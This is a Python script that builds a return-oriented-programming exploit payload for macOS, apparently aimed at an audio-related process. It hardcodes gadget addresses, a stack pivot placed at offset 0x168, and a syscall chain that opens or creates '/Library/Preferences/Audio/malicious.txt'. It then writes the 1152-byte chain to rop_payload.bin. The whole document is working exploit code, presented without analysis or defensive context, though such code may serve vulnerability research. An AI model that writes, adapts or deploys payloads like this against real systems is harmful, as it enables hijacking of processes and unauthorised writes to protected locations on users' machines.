#!/usr/bin/env python3

import struct

# Helper for 64-bit little-endian packing
def p64(val):
    return struct.pack("<Q", val)

# Gadget Addresses
STACK_PIVOT_GADGET  = 0x7ff810b908a4  # xchg rsp, rax ; xor edx, edx ; ret
POP_RDI_GADGET      = 0x7ff80f185186  # pop rdi ; ret
POP_RSI_GADGET      = 0x7ff811fa1e36  # pop rsi ; ret
POP_RDX_GADGET      = 0x7ff811cce418  # pop rdx; ret
POP_RAX_GADGET      = 0x7ff811c93b09  # pop rax; ret
ADD_HEX30_RSP       = 0x7ff80f17d035  # add rsp, 0x30 ; pop rbp ; ret
LOAD_RSP_PLUS_EIGHT = 0x7ffd1491ac80  # lea rax, [rsp + 8] ; ret
MOV_RAX_TO_RSI      = 0x7ff80f41b060  # mov rsi, rax ; mov rax, rsi ; pop rbp ; ret
MOV_RSI_TO_RDI      = 0x7ff827af146d  # mov rdi, rsi ; mov rax, rdi ; mov rdx, rdi ; ret
DEADBEEF_POINTER    = 0xdeadbeeffeedface 
INLINE_STRING       = ( #"/Library/Preferences/Audio/malicious.txt\0" (41 bytes including null terminator)
                        b"\x2f\x4c\x69\x62\x72\x61\x72\x79\x2f\x50\x72\x65\x66\x65\x72"
                        b"\x65\x6e\x63\x65\x73\x2f\x41\x75\x64\x69\x6f\x2f\x6d\x61\x6c"
                        b"\x69\x63\x69\x6f\x75\x73\x2e\x74\x78\x74\x00"
                      )
POP_RCX_GADGET      = 0x7ff8093d7a98  # pop rcx ; ret
JMP_RCX_GADGET      = 0x7ff80eafebff  # jmp rcx
SYSCALL             = 0x7ff80f1534d0  # syscall

# Beginning of stack after pivot
rop   = bytearray(p64(LOAD_RSP_PLUS_EIGHT)) # lea rax, [rsp + 8] ; ret 
rop  += p64(ADD_HEX30_RSP)       # add rsp, 0x30 ; pop rbp ; ret
rop  += INLINE_STRING            # Inline "/Library/Preferences/Audio/malicious.txt"
rop  += b'\x42' * 15             # pop rbp filler and will be moved past    
rop  += p64(MOV_RAX_TO_RSI)      # mov rsi, rax ; mov rax, rsi ; pop rbp ; ret
rop  += p64(0x4242424242424242)  # pop rbp filler   
rop  += p64(MOV_RSI_TO_RDI)      # mov rdi, rsi ; mov rax, rdi ; mov rdx, rdi ; ret
rop  += p64(POP_RSI_GADGET)      # pop rsi ; ret
rop  += p64(0x201)               # O_CREAT | O_WRONLY
rop  += p64(POP_RDX_GADGET)      # pop rdx ; ret
rop  += p64(0x1A4)               # 0644     
rop  += p64(POP_RAX_GADGET)      # pop rax ; ret
rop  += p64(0x2000005)           # syscall number for open()
rop  += p64(SYSCALL)             # syscall
rop += b'\x42' * (1152 - len(rop))

# [rax + 0x168] â†’ pointer to pivot gadget (entrypoint)
rop[0x168:0x170] = p64(STACK_PIVOT_GADGET)  # xchg rsp, rax ; xor edx, edx ; ret

print("ROP length:", len(rop))  # Should print 1152
# Write to file
with open("rop_payload.bin", "wb") as f:
    f.write(rop)

print("[*] ROP chain written to rop_payload.bin")

